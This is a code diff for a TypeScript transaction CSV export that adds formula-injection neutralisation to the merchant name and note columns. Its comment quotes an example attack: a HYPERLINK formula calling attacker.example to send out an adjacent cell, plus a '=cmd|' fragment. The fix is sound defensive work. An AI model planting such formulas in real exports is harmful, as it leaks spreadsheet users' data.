@@ -312,6 +312,37 @@ function csvCell(value: string | null): string {
   return `"${(value ?? '').replaceAll('"', '""')}"`;
 }
 
+/**
+ * The characters a spreadsheet reads as "this cell is a formula" (CWE-1236).
+ *
+ * `\t` and `\r` are in the set because Excel skips leading whitespace before
+ * deciding, so `\t=cmd|...` is still a formula.
+ */
+const FORMULA_LEAD = /^[=+\-@\t\r]/u;
+
+/**
+ * A **free-text** cell: RFC 4180 plus formula neutralisation.
+ *
+ * Quoting alone is not a defence. Excel, LibreOffice Calc and Google Sheets all
+ * strip the quotes while parsing a `.csv` and *then* evaluate a leading `=`,
+ * `+`, `-` or `@` — so `"=HYPERLINK(""https://attacker.example/?x=""&A1,""Click"")"`
+ * becomes a live, clickable exfiltration link pointed at the neighbouring cell.
+ * The reachable inputs are `name` (a Plaid merchant descriptor, or a row from a
+ * CSV the user was talked into importing) and `note`, so the content is
+ * attacker-controlled and the sink is a spreadsheet on the user's own machine.
+ *
+ * A leading `'` is the OWASP-documented neutraliser: every major spreadsheet
+ * treats it as "the rest of this cell is literal text" and does not display it.
+ *
+ * Deliberately **not** applied to `csvCell`: `amount_minor` is negative on every
+ * outflow, and prefixing `-2500` would turn every amount in the file into text.
+ * Machine columns keep `csvCell`; only the two free-text columns use this.
+ */
+function csvText(value: string | null): string {
+  const text = value ?? '';
+  return csvCell(FORMULA_LEAD.test(text) ? `'${text}` : text);
+}
+
 export const transactionRoutes = (deps: RouteDeps): FastifyPluginAsyncZod => {
   const { guards, database, clock } = deps;
 
@@ -413,7 +444,7 @@ export const transactionRoutes = (deps: RouteDeps): FastifyPluginAsyncZod => {
             lines.push(
               [
                 csvCell(row.effective.date),
-                csvCell(row.effective.name),
+                csvText(row.effective.name),
                 csvCell(row.effective.amount.minor.toString()),
                 csvCell(row.effective.amount.currency),
                 csvCell(row.accountId),
@@ -421,7 +452,7 @@ export const transactionRoutes = (deps: RouteDeps): FastifyPluginAsyncZod => {
                 csvCell(String(row.effective.pending)),
                 csvCell(String(row.effective.excluded)),
                 csvCell(String(row.isTransfer)),
-                csvCell(row.effective.note),
+                csvText(row.effective.note),
               ].join(','),
             );
           }
